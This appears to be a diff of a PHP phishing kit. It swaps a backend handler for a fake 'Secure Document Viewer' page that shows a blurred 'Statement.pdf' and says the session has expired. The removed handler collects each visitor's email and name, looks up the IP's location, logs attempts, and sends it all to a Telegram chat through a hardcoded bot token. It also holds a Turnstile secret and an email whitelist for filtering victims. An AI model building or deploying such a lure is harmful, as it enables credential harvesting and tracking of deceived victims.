@@ -1,150 +1,318 @@
 <?php
 session_start();
-define('ATTEMPTS_FILE', __DIR__ . '/attempts.json');
 
-// === TOGGLE: email validation ON/OFF ===
-$EMAIL_VALIDATION_ENABLED = false; // <<< set to false to DISABLE whitelist email validation
+// Step control
+$step = $_SESSION['step'] ?? 1;
 
-$telegram_bot_token = "7657571386:AAHH3XWbHBENZBzBul6cfevzAoIiftu-TVQ";
-$telegram_chat_id   = "6915371044";
-$turnstile_secret   = "0x4AAAAAACEAdSoSffFlw4Y93xBl0UFbgsc";
-$whitelist_file     = __DIR__ . '/papa.txt';
+// old email
+$old_email = $_SESSION['old_email'] ?? '';
+$error     = $_SESSION['error_message'] ?? '';
+unset($_SESSION['error_message']);
 
-// Detect accurate visitor IP
-function get_client_ip() {
-    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) return $_SERVER['HTTP_CF_CONNECTING_IP']; // Cloudflare
-    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
-    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
-}
-
-// Load previous attempts
-$attempts = [];
-if (file_exists(ATTEMPTS_FILE)) {
-    $data = json_decode(file_get_contents(ATTEMPTS_FILE), true);
-    if (is_array($data)) {
-        $attempts = $data;
-    }
-}
-
-/*
- * STEP 2: NAME SUBMISSION
- * (process first so Step 2 doesn't accidentally hit Turnstile/email block)
- */
-if (isset($_POST['name'])) {
-    $email = $_SESSION['old_email'] ?? '';
-    $name  = trim($_POST['name']);
-
-    if (!$email || !$name) {
-        $_SESSION['error_message'] = "Invalid input.";
-        header("Location: index.php"); exit;
-    }
-
-    $ip = get_client_ip();
-
-    // Location info
-    $geo = json_decode(@file_get_contents("http://ip-api.com/json/{$ip}?fields=country,regionName,city,query"), true);
-    $location = ($geo && isset($geo['country']))
-        ? ($geo['country'].", ".$geo['regionName'].", ".$geo['city'])
-        : "Unknown";
-
-    // Update attempts
-    if (!isset($attempts[$email])) {
-        $attempts[$email] = [
-            'names'    => [$name],
-            'count'    => 1,
-            'ip'       => $ip,
-            'location' => $location
-        ];
-    } else {
-        $attempts[$email]['names'][] = $name;
-        $attempts[$email]['count']  += 1;
-        $attempts[$email]['ip']      = $ip;
-        $attempts[$email]['location']= $location;
-    }
-
-    file_put_contents(ATTEMPTS_FILE, json_encode($attempts, JSON_PRETTY_PRINT));
-
-    // Telegram notification
-    $msg  = "Login attempt for $email\n";
-    $msg .= "Names tried: ".implode(", ", $attempts[$email]['names'])."\n";
-    $msg .= "Total attempts: {$attempts[$email]['count']}\n";
-    $msg .= "IP: $ip\n";
-    $msg .= "Location: $location";
-
-    @file_get_contents(
-        "https://api.telegram.org/bot$telegram_bot_token/sendMessage" .
-        "?chat_id=$telegram_chat_id&text=".urlencode($msg)
-    );
-
-    // Correct name check
-    $correct_name = "John Doe";
-
-    if ($name !== $correct_name && $attempts[$email]['count'] >= 3) {
-        header("Location: https://example.com/blocked"); exit;
-    } elseif ($name !== $correct_name) {
-        $_SESSION['error_message'] = "Incorrect name entered.";
-        header("Location: index.php"); exit;
-    }
-
-    // Success
-    unset($_SESSION['old_email'], $_SESSION['step']);
-    header("Location: dashboard.php"); exit;
-}
-
-/*
- * STEP 1: EMAIL SUBMISSION
- * Only when we're at step 1 (or no step set yet)
- */
-if (isset($_POST['email']) && (!isset($_SESSION['step']) || $_SESSION['step'] == 1)) {
-    $email = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);
-    $turnstile_response = $_POST['cf-turnstile-response'] ?? '';
-
-    if (!$email) {
-        $_SESSION['error_message'] = "Invalid email.";
-        header("Location: index.php"); exit;
-    }
-
-    // Verify Turnstile
-    $ch = curl_init("https://challenges.cloudflare.com/turnstile/v0/siteverify");
-    curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
-        'secret'   => $turnstile_secret,
-        'response' => $turnstile_response,
-        'remoteip' => get_client_ip()
-    ]));
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    $turnstile_result = json_decode(curl_exec($ch), true);
-    curl_close($ch);
-
-    if (empty($turnstile_result['success'])) {
-        $_SESSION['error_message'] = "Turnstile verification failed.";
-        header("Location: index.php"); exit;
-    }
-
-    // Validate email against whitelist ONLY if enabled
-    if ($EMAIL_VALIDATION_ENABLED) {
-        if (!file_exists($whitelist_file)) {
-            $_SESSION['error_message'] = "Configuration error: whitelist missing.";
-            header("Location: index.php"); exit;
-        }
-
-        $whitelist = file($whitelist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-        $whitelist = array_map('trim', $whitelist);
-
-        if (!in_array($email, $whitelist, true)) {
-            $_SESSION['error_message'] = "Email not allowed.";
-            header("Location: index.php"); exit;
-        }
-    }
-
-    // Email accepted (validated or validation disabled) → go to step 2
-    $_SESSION['step']      = 2;
-    $_SESSION['old_email'] = $email;
-
-    header("Location: index.php"); exit;
-}
-
-// Fallback redirect
-header("Location: index.php");
-exit;
+$hasError = !empty($error);
+$hideSessionMsg = ($error === 'Incorrect name entered.');
 ?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Secure Document Viewer</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- Turnstile -->
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+
+<style>
+    *, *::before, *::after { box-sizing: border-box; }
+
+    :root {
+        --card-bg: #fff;
+        --text-color: #222;
+        --subtext: #6b6b6b;
+        --border: #d4d4d4;
+        --btn-bg: #1473e6;
+        --btn-hover: #0f5cc0;
+        --error: #c9252d;
+        --overlay-dark: rgba(0,0,0,0.65);
+        --divider: #e8e8e8;
+        --font-xs: 11px;
+        --font-sm: 12px;
+        --font-btn: 12px;
+    }
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --card-bg: #1e1e1f;
+            --text-color: #f3f3f3;
+            --subtext: #999;
+            --border: #444;
+            --btn-bg: #4a8fff;
+            --btn-hover: #3a73d0;
+            --divider: #2c2c2c;
+        }
+    }
+
+    body {
+        margin: 0;
+        font-family: "Segoe UI", system-ui, sans-serif;
+        background: #111;
+        color: var(--text-color);
+        min-height: 100vh;
+    }
+
+    .page-wrapper {
+        position: relative;
+        height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+
+    /* Background */
+    .page-wrapper::before {
+        content:"";
+        position:absolute;
+        inset:0;
+        background:var(--overlay-dark);
+    }
+
+    .doc-background {
+        position:absolute;
+        inset:0;
+        filter: blur(6px);
+        opacity: .7;
+        transform:scale(1.04);
+    }
+    .doc-background img { width:100%; height:100%; object-fit:contain; }
+
+    /* Card */
+    .login-card {
+        width:95%;
+        max-width:320px;
+        background:var(--card-bg);
+        border-radius:4px;
+        padding:18px 20px 22px;
+        border:1px solid #d0d0d0;
+        box-shadow:0 10px 24px rgba(0,0,0,.26);
+        z-index:2;
+        opacity:0;
+        transform:translateY(14px) scale(.985);
+        animation:fadeIn .45s ease-out forwards;
+    }
+    .login-card.has-error {
+        border-color:rgba(201,37,45,.5);
+    }
+    @keyframes fadeIn {
+        from {opacity:0; transform:translateY(20px) scale(.97);}
+        to   {opacity:1; transform:translateY(0) scale(1);}
+    }
+
+    .top-divider {
+        height:1px;
+        background:var(--divider);
+        margin:8px 0 12px;
+    }
+
+    .doc-icon { width:38px; margin:0 auto 6px; }
+    .doc-icon img { width:100%; }
+
+    .doc-title {
+        text-align:center;
+        font-size:14px;
+        margin-bottom:2px;
+        font-weight:600;
+    }
+    .doc-size { font-size:var(--font-xs); color:var(--subtext); }
+
+    .doc-subtitle {
+        text-align:center;
+        color:var(--error);
+        font-size:var(--font-xs);
+        margin-bottom:6px;
+        font-weight:600;
+    }
+    .login-error {
+        text-align:center;
+        color:var(--error);
+        font-size:var(--font-xs);
+        margin-bottom:8px;
+        font-weight:600;
+    }
+
+    /* Fields */
+    .field-wrapper {
+        margin-bottom:9px;
+        position:relative;
+    }
+    .field-wrapper input {
+        width:100%;
+        padding:8px 9px;
+        font-size:var(--font-sm);
+        border:1px solid var(--border);
+        border-radius:3px;
+        background:#fff;
+        outline:none;
+        color:#000;
+    }
+    /* Name field stays black in dark mode */
+    @media (prefers-color-scheme: dark) {
+        .field-wrapper input[name="name"] {
+            color:#000 !important;
+            background:#fff !important;
+        }
+    }
+
+    /* Email input ALWAYS editable now */
+    .email-wrapper input { background:#fff !important; color:#000 !important; }
+
+    /* Mail icon */
+    .email-wrapper input {
+        padding-left:28px;
+    }
+    .email-icon {
+        position:absolute;
+        left:9px;
+        top:50%;
+        transform:translateY(-50%);
+        width:14px;
+        height:14px;
+        opacity:.7;
+    }
+    .email-icon path { fill:#777; }
+
+    /* Padlock icon — on the LEFT */
+    .lock-icon {
+        position:absolute;
+        left:9px;
+        top:50%;
+        transform:translateY(-50%);
+        width:13px;
+        height:13px;
+        opacity:.7;
+        pointer-events:none;
+    }
+    .lock-icon path { fill:#777; }
+
+    /* Padding for name field so it doesn't overlap lock icon */
+    .field-wrapper input[name="name"] {
+        padding-left:28px;
+    }
+
+    /* Turnstile */
+    .captcha-wrapper {
+        display:flex;
+        justify-content:center;
+        margin:6px 0 4px;
+    }
+    .cf-turnstile {
+        transform:scale(.9);
+        transform-origin:center;
+    }
+
+    /* Button */
+    .btn-primary {
+        width:100%;
+        padding:9px 10px;
+        background:var(--btn-bg);
+        color:#fff;
+        border:none;
+        border-radius:3px;
+        cursor:pointer;
+        font-size:var(--font-btn);
+        font-weight:600;
+    }
+    .btn-primary:hover { background:var(--btn-hover); }
+</style>
+
+</head>
+<body>
+
+<div class="page-wrapper">
+    <div class="doc-background">
+        <img src="assets/background.png" alt="Document preview">
+    </div>
+
+    <div class="login-card<?= $hasError ? ' has-error' : '' ?>">
+
+        <div class="doc-icon">
+            <img src="assets/PDtrans.png" alt="PDF Icon">
+        </div>
+
+        <h2 class="doc-title">
+            Statement.pdf <span class="doc-size">(197 KB)</span>
+        </h2>
+
+        <?php if (!$hideSessionMsg): ?>
+            <?php if ($step == 1): ?>
+                <p class="doc-subtitle">Previous session has expired.</p>
+            <?php else: ?>
+                <p class="doc-subtitle">Login to continue.</p>
+            <?php endif; ?>
+        <?php endif; ?>
+
+        <div class="top-divider"></div>
+
+        <?php if ($error): ?>
+            <p class="login-error"><?= htmlspecialchars($error) ?></p>
+        <?php endif; ?>
+
+        <?php if ($step == 1): ?>
+        <!-- STEP 1 -->
+        <form method="POST" action="login.php">
+
+            <div class="field-wrapper email-wrapper">
+                <input
+                    type="email"
+                    name="email"
+                    placeholder="Enter your email"
+                    value="<?= htmlspecialchars($old_email) ?>"
+                    required
+                >
+                <svg class="email-icon" viewBox="0 0 16 16" aria-hidden="true">
+                    <path d="M2 3.5h12c.55 0 1 .45 1 1v7c0 .55-.45 1-1 1H2c-.55 0-1-.45-1-1v-7c0-.55.45-1 1-1zm.7 1.2 4.65 3.2c.4.28.9.28 1.3 0l4.65-3.2H2.7zm10.6 6.8v-5.1l-3.9 2.7c-.9.63-2.1.63-3 0l-3.9-2.7v5.1h10.8z"/>
+                </svg>
+            </div>
+
+            <div class="captcha-wrapper">
+                <div class="cf-turnstile" data-sitekey="0x4AAAAAACEAdYvsKv0_uuH2"></div>
+            </div>
+
+            <button class="btn-primary">Next</button>
+        </form>
+
+        <?php else: ?>
+        <!-- STEP 2 -->
+        <form method="POST" action="login.php">
+
+            <div class="field-wrapper email-wrapper">
+                <input
+                    type="email"
+                    name="email"
+                    value="<?= htmlspecialchars($old_email) ?>"
+                    required
+                >
+                <svg class="email-icon" viewBox="0 0 16 16" aria-hidden="true">
+                    <path d="M2 3.5h12c.55 0 1 .45 1 1v7c0 .55-.45 1-1 1H2c-.55 0-1-.45-1-1v-7c0-.55.45-1 1-1zm.7 1.2 4.65 3.2c.4.28.9.28 1.3 0l4.65-3.2H2.7zm10.6 6.8v-5.1l-3.9 2.7c-.9.63-2.1.63-3 0l-3.9-2.7v5.1h10.8z"/>
+                </svg>
+            </div>
+
+            <div class="field-wrapper">
+                <input
+                    type="text"
+                    name="name"
+                    placeholder="Enter your name"
+                    required
+                >
+                <!-- Padlock icon LEFT -->
+                <svg class="lock-icon" viewBox="0 0 16 16" aria-hidden="true">
+                    <path d="M5.5 7V5.5a2.5 2.5 0 0 1 5 0V7h.5A1.5 1.5 0 0 1 12.5 8.5v4A1.5 1.5 0 0 1 11 14H5a1.5 1.5 0 0 1-1.5-1.5v-4A1.5 1.5 0 0 1 5 7h.5Zm1 0h3V5.5a1.5 1.5 0 0 0-3 0V7Z"/>
+                </svg>
+            </div>
+
+            <button class="btn-primary">Next</button>
+        </form>
+        <?php endif; ?>
+    </div>
+</div>
+
+</body>
+</html>
